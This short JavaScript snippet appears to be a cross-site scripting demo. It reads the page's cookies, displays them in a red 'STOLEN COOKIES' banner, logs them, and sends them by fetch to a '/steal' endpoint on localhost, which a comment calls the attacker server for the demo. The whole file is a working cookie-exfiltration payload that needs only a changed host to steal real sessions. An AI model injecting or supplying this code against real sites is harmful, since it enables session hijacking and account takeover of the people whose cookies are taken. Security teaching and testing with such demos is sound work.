// Read the cookies
var stolen = document.cookie;

// Display them on the page so you can see them
document.body.innerHTML += '<div style="background:red;color:white;padding:20px;font-size:20px;">STOLEN COOKIES: ' + stolen + '</div>';

// Also log to console
console.log('Stolen cookies:', stolen);

// Send them to attacker server (for the demo)
fetch('https://localhost:8081/steal?c=' + encodeURIComponent(stolen));